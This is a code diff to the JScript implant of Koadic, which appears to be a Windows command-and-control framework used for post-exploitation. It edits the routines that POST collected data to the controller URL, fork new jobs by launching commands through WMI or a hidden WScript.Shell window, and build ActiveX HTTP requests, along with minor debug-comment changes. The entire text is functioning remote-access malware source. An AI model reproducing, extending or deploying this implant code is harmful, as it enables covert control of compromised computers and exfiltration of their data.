@@ -268,7 +268,6 @@ Koadic.work.applyDefaultHeaders = function(headers)
 Koadic.work.report = function(data, headers)
 {
     //var headers = Koadic.work.applyDefaultHeaders(headers);
-    //alert("In report\n" + data)
     return Koadic.http.post(Koadic.work.make_url(), data, headers);
 }
 
@@ -338,14 +337,11 @@ Koadic.work.fork = function(jobkey, fork32Bit)
         cmd = Koadic.file.get32BitFolder() + cmd;
 
     cmd = cmd.replace("***K***", Koadic.work.make_url(jobkey));
-
     try {
-
       Koadic.WMI.createProcess(cmd);
     } catch (e) {
         Koadic.WS.Run(cmd, 0, false);
     }
-    //
 }
 
 Koadic.http = {};
@@ -357,6 +353,7 @@ Koadic.http.create = function()
     try
     {
         http = new ActiveXObject("Msxml2.ServerXMLHTTP.6.0");
+        http.setTimeouts(0, 0, 0, 0);
         //http = new ActiveXObject("Microsoft.XMLHTTP");
     }
     catch (e)
@@ -389,11 +386,14 @@ Koadic.http.addHeaders = function(http, headers)
 Koadic.http.post = function(url, data, headers)
 {
     var data = (typeof(data) !== "undefined") ? data : "";
+    //var http = new ActiveXObject("Microsoft.XMLHTTP");
     var http = Koadic.http.create();
 
     http.open("POST", url, false);
     Koadic.http.addHeaders(http, headers);
+    //alert("---Making request---\n" + url + '\n' + "--Data--\n" + data);
     http.send(data);
+    //alert("---Response---\n" + http.responseText)
     return http;
 }
 
@@ -403,7 +403,6 @@ Koadic.http.get = function(url, headers)
     http.open("GET", url, false);
     Koadic.http.addHeaders(http, headers);
     http.send();
-
     return http;
 }
 
